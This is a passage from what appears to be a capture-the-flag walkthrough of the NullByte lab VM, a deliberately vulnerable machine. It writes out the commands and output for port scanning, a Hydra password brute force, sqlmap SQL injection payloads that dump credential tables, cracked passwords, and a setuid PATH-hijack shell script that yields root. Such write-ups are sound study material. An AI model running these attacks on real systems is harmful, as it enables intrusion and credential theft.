<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ sudo netdiscover -r 10.1.1.0/24
</span><span class='line'> Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                  
</span><span class='line'>                                                                                                                                                                
</span><span class='line'> 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300                                                                                                
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address      Count  Len   MAC Vendor                   
</span><span class='line'> ----------------------------------------------------------------------------- 
</span><span class='line'> 10.1.1.1        00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                  
</span><span class='line'> 10.1.1.2        00:50:56:fd:d1:6b    01    060   VMWare, Inc.                                                                                                  
</span><span class='line'> 10.1.1.134      00:0c:29:e1:e0:98    01    060   VMware, Inc.                                                                                              
</span><span class='line'> 10.1.1.254      00:50:56:ee:31:18    01    060   VMWare, Inc.</span></code></pre></td></tr></table></div></figure>


<p>10.10.10.134 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ sudo us -H -msf -Iv -p 1-65535 10.1.1.134
</span><span class='line'>listener statistics 147984 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open              http[   80]     from 10.1.1.134  ttl 64 
</span><span class='line'>TCP open            sunrpc[  111]     from 10.1.1.134  ttl 64 
</span><span class='line'>TCP open    multiling-http[  777]     from 10.1.1.134  ttl 64 
</span><span class='line'>TCP open           unknown[32942]     from 10.1.1.134  ttl 64</span></code></pre></td></tr></table></div></figure>


<p>From the result above, TCP port 80, 111, 777 and 32942 have been discovered.</p>

<p>Then I run NMAP scan to probe more detail information for the four opening ports.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 6.49BETA4 scan initiated Mon Aug 17 07:06:13 2015 as: nmap -v -sV -O -A -T4 -p 80,111,777,32942 -oN NullByte_nmap.txt 10.1.1.134
</span><span class='line'>Nmap scan report for 10.1.1.134
</span><span class='line'>Host is up (0.00044s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
</span><span class='line'>|_http-methods: GET HEAD POST OPTIONS
</span><span class='line'>|_http-server-header: Apache/2.4.10 (Debian)
</span><span class='line'>|_http-title: Null Byte 00 - level 1
</span><span class='line'>111/tcp   open  rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          32942/tcp  status
</span><span class='line'>|_  100024  1          47213/udp  status
</span><span class='line'>777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
</span><span class='line'>|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
</span><span class='line'>|_  256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
</span><span class='line'>32942/tcp open  status  1 (RPC #100024)
</span><span class='line'>MAC Address: 00:0C:29:E1:E0:98 (VMware)
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.029 days (since Mon Aug 17 06:25:06 2015)
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>TCP Sequence Prediction: Difficulty=264 (Good luck!)
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.44 ms 10.1.1.134
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'># Nmap done at Mon Aug 17 07:06:29 2015 -- 1 IP address (1 host up) scanned in 16.18 seconds</span></code></pre></td></tr></table></div></figure>


<p>I found that the port 777 is running SSH and apache 2.4.10 is running on port 80, and the server is Debian Linux with 3.x kernel.</p>

<p>Then I use <code>nikto</code> to scan if any known vulnerabilty can be found which will be a life saver.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.1.1.134
</span><span class='line'>+ Target Hostname:    10.1.1.134
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-08-17 07:01:56 (GMT-4)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.4.10 (Debian)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0xc4 0x51c42a5c32a70 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
</span><span class='line'>+ Uncommon header 'x-ob_mode' found, with contents: 0
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
</span><span class='line'>+ 7668 requests: 0 error(s) and 9 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-08-17 07:02:17 (GMT-4) (21 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Nothing too exciting, but found phpmyadmin installed and a folder <code>/phpmyadmin/</code>.</p>

<h3>Secret in the Pic</h3>

<p>Then I tried default password and some weak passwords with login phpmyadmin, but all failed.</p>

<p>Then I open iceweasel browser to have a close look at the website. There is only a picture with a sentence <code>If you search for the laws of harmony, you will find knowledge.</code></p>

<p>Nothing wrong about the sentence&hellip; but hint is hidden in the picture&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte$ strings main.gif 
</span><span class='line'>GIF89a
</span><span class='line'>P-): kzMb5nVYJw
</span><span class='line'>cccIII@@@GGG444999```&lt;&lt;&lt;
</span><span class='line'>ooo>>>EEE
</span><span class='line'>???^^^
</span><span class='line'>HHH;;;
</span><span class='line'>gggRRRJJJ+++
</span><span class='line'>TTTZZZ
</span><span class='line'>QQQ///
</span><span class='line'>~~~'''CCC
</span><span class='line'>   AAA
</span><span class='line'>aaa222
</span><span class='line'>... ...</span></code></pre></td></tr></table></div></figure>


<p>Pay attention to the second line below the <code>GIF89a</code>:</p>

<p><code>P-): kzMb5nVYJw</code></p>

<p>Then I tried to use the string &lsquo;kzMb5nVYJw&rsquo; as an hidden folder and found the hidden login page:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/nullbyte1/1.png"></p>

<p>From the source code, I noticed that this form is not connected to mysql and password is not complex&hellip; so here would be an online brute force attacking based on password-dict.</p>

<p>I use Hydra with rockyou.txt dictionary to brute force the login form and got the password: <code>elite</code>. (The parameter <code>-l admin</code> does not make any sense, just get rid of errors)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte$ sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.1.1.134 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid"
</span><span class='line'>[sudo] password for F4l13n: 
</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-17 09:20:13
</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
</span><span class='line'>[DATA] attacking service http-post-form on port 80
</span><span class='line'>[80][http-post-form] host: 10.1.1.134   login: admin   password: elite
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-17 09:20:57</span></code></pre></td></tr></table></div></figure>


<p>When I logged in with password <code>elite</code>, I have been forwarded to the following username searching page.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/nullbyte1/2.png"></p>

<p>After tired several common SQLi test, I found SQL injection vulnerability exists in the parameter <code>usrtosearch</code>, the injection point is <code>http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=admin</code></p>

<p>Then I use SQLMAP to finish all the rest works:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u "http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*" --dbs
</span><span class='line'>... ...
</span><span class='line'>[09:45:30] [WARNING] in OR boolean-based injections, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
</span><span class='line'>URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
</span><span class='line'>sqlmap identified the following injection point(s) with a total of 151 HTTP(s) requests:
</span><span class='line'>---
</span><span class='line'>Parameter: #1* (URI)
</span><span class='line'>    Type: boolean-based blind
</span><span class='line'>    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
</span><span class='line'>    Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=-8162" OR 3808=3808#
</span><span class='line'>
</span><span class='line'>    Type: AND/OR time-based blind
</span><span class='line'>    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)
</span><span class='line'>    Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=123" AND (SELECT * FROM (SELECT(SLEEP(5)))hjFz)#
</span><span class='line'>
</span><span class='line'>    Type: UNION query
</span><span class='line'>    Title: MySQL UNION query (NULL) - 3 columns
</span><span class='line'>    Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=123" UNION ALL SELECT NULL,NULL,CONCAT(0x7170706271,0x6845736a5777725a736a,0x71706b7a71)#
</span><span class='line'>---
</span><span class='line'>[09:45:32] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Debian
</span><span class='line'>web application technology: Apache 2.4.10
</span><span class='line'>back-end DBMS: MySQL 5.0.12
</span><span class='line'>[09:45:32] [INFO] fetching database names
</span><span class='line'>available databases [5]:
</span><span class='line'>[*] information_schema
</span><span class='line'>[*] mysql
</span><span class='line'>[*] performance_schema
</span><span class='line'>[*] phpmyadmin
</span><span class='line'>[*] seth
</span><span class='line'>
</span><span class='line'>[09:45:33] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.1.1.134'
</span><span class='line'>
</span><span class='line'>[*] shutting down at 09:45:33</span></code></pre></td></tr></table></div></figure>


<p>Checking the databases to grab passwords:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u "http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*" --batch --smart --dump -C User,Password,Host,Super_priv -T user -D mysql
</span><span class='line'>
</span><span class='line'>... ...
</span><span class='line'>Database: mysql
</span><span class='line'>Table: user
</span><span class='line'>[6 entries]
</span><span class='line'>+------------------+-------------------------------------------------------+-----------+------------+
</span><span class='line'>| User             | Password                                              | Host      | Super_priv |
</span><span class='line'>+------------------+-------------------------------------------------------+-----------+------------+
</span><span class='line'>| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | localhost | Y          |
</span><span class='line'>| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | nullbyte  | Y          |
</span><span class='line'>| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | 127.0.0.1 | Y          |
</span><span class='line'>| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | ::1       | Y          |
</span><span class='line'>| debian-sys-maint | *BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC             | localhost | Y          |
</span><span class='line'>| phpmyadmin       | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | localhost | N          |
</span><span class='line'>+------------------+-------------------------------------------------------+-----------+------------+
</span><span class='line'>
</span><span class='line'>[09:56:13] [WARNING] table 'mysql.`user`' dumped to CSV file '/root/.sqlmap/output/10.1.1.134/dump/mysql/user-f3649c95.csv'
</span><span class='line'>[09:56:13] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.1.1.134'
</span><span class='line'>
</span><span class='line'>[*] shutting down at 09:56:13</span></code></pre></td></tr></table></div></figure>


<p>Found mysql database login (this also can be used to login phpmyadmin): <code>root / sunnyvale</code></p>

<h3>Be ramses!</h3>

<p>There is another users table in database <code>seth</code>, which including the password hash of user <code>ramses</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u "http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*" --batch --smart --dump -T users -D seth
</span><span class='line'>... ...
</span><span class='line'>[10:12:15] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Debian
</span><span class='line'>web application technology: Apache 2.4.10
</span><span class='line'>back-end DBMS: MySQL 5.0.12
</span><span class='line'>[10:12:15] [INFO] fetching columns 'position, user, id, pass' for table 'users' in database 'seth'
</span><span class='line'>[10:12:15] [INFO] fetching entries of column(s) '`position`, `user`, id, pass' for table 'users' in database 'seth'
</span><span class='line'>[10:12:15] [INFO] analyzing table dump for possible password hashes
</span><span class='line'>Database: seth
</span><span class='line'>Table: users
</span><span class='line'>[2 entries]
</span><span class='line'>+----+--------+------------+---------------------------------------------+
</span><span class='line'>| id | user   | position   | pass                                        |
</span><span class='line'>+----+--------+------------+---------------------------------------------+
</span><span class='line'>| 1  | ramses | &lt;blank>    | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |
</span><span class='line'>| 2  | isis   | employee   | --not allowed--                             |
</span><span class='line'>+----+--------+------------+---------------------------------------------+
</span><span class='line'>
</span><span class='line'>[10:12:15] [INFO] table 'seth.users' dumped to CSV file '/root/.sqlmap/output/10.1.1.134/dump/seth/users.csv'
</span><span class='line'>[10:12:15] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.1.1.134'
</span><span class='line'>
</span><span class='line'>[*] shutting down at 10:12:15</span></code></pre></td></tr></table></div></figure>


<p>Found user login credentials: <code>ramses / YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE</code></p>

<p>Base64 decoded the encrypted password and got a MD5 hash: <code>c6d6bd7ebf806f43c76acc3681703b81</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ echo YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | base64 -d
</span><span class='line'>c6d6bd7ebf806f43c76acc3681703b81base64: invalid input</span></code></pre></td></tr></table></div></figure>


<p>Then crack the MD5 hash to get password in plaintext, which is <code>omega</code></p>

<p>Then downloading <code>/etc/passwd</code> for further enumeration.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span><span class='line'>systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span><span class='line'>systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span><span class='line'>systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span><span class='line'>messagebus:x:104:111::/var/run/dbus:/bin/false
</span><span class='line'>avahi:x:105:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
</span><span class='line'>Debian-exim:x:106:114::/var/spool/exim4:/bin/false
</span><span class='line'>statd:x:107:65534::/var/lib/nfs:/bin/false
</span><span class='line'>colord:x:108:117:colord colour management daemon,,,:/var/lib/colord:/bin/false
</span><span class='line'>sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>saned:x:110:119::/var/lib/saned:/bin/false
</span><span class='line'>hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
</span><span class='line'>bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
</span><span class='line'>eric:x:1001:1001:,,,:/home/eric:/bin/bash
</span><span class='line'>mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>ramses:x:1002:1002:,,,:/home/ramses:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>user <code>ramses</code> found in <code>/etc/passwd</code> file.</p>

<p>From previous findings, I know SSH is open on port 777, so try to SSH login with cracked password <code>ramses / omega</code> and bingo!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte/sqlmap_rst$ ssh ramses@10.1.1.134 -p 777
</span><span class='line'>ramses@10.1.1.134's password: 
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
</span><span class='line'>ramses@NullByte:~$ id
</span><span class='line'>uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
</span><span class='line'>ramses@NullByte:~$ pwd
</span><span class='line'>/home/ramses
</span><span class='line'>ramses@NullByte:~$</span></code></pre></td></tr></table></div></figure>


<p>Now I am ramses!</p>

<h3>Privilege Escalation</h3>

<p>Looking around and found interesting program <code>procwatch</code> which has <code>setuid</code> set in the folder <code>/var/www/backup</code></p>

<p>By running the program and analysing the outcome, I can recognize that it calls system command <code>ps</code> in the program. However the program does not use full path of <code>ps</code>, so here is mis-configuration vulnerability which could be exploited by an attacker to make fake <code>ps</code> and set <code>$PATH</code> to get ROOT privilege.</p>

<p>Then I wrote a shell script and saved as &lsquo;ps&rsquo;, and grant executable permition for it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat ps
</span><span class='line'>#!/bin/sh
</span><span class='line'>id
</span><span class='line'>/bin/sh
</span><span class='line'>
</span><span class='line'># chmod +x ps</span></code></pre></td></tr></table></div></figure>


<p>Then change the environment variable <code>$PATH</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
</span><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>Then run the program <code>procwatch</code> to get ROOT:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ ./procwatch 
</span><span class='line'>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
</span><span class='line'># id
</span><span class='line'>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
</span><span class='line'># cd /root
</span><span class='line'># ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw-r--r-- 1 root root 1170 Aug  2 01:45 proof.txt</span></code></pre></td></tr></table></div></figure>


<p>Catch the flag <code>proof.txt</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
